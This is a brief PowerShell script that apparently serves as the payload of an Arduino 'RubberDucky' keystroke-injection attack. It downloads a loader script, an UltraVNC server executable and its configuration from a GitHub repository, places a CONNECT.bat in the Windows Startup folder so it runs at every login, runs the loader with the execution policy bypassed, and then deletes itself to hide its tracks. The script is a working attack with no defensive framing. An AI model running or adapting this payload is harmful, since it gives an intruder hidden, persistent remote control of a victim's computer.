$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$documentsPath = [System.Environment]::GetFolderPath('MyDocuments')
$self = $MyInvocation.MyCommand.Definition
Invoke-WebRequest -Uri "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/LOAD.ps1" -OutFile "$documentsPath\LOAD.ps1"
Invoke-WebRequest -Uri "https://github.com/EmaBixD/Arduino-RubberDucky/raw/main/client/winvnc.exe" -OutFile "$documentsPath\winvnc.exe"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmaBixD/Arduino-RubberDucky/main/client/UltraVNC.ini" -OutFile "$documentsPath\UltraVNC.ini"
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/EmaBixD/Arduino-RubberDucky/main/client/CONNECT.bat" -OutFile "$startupPath\CONNECT.bat"
powershell -ExecutionPolicy Bypass -File "$documentsPath\LOAD.ps1"
Start-Sleep -Seconds 1
Remove-Item $self -Force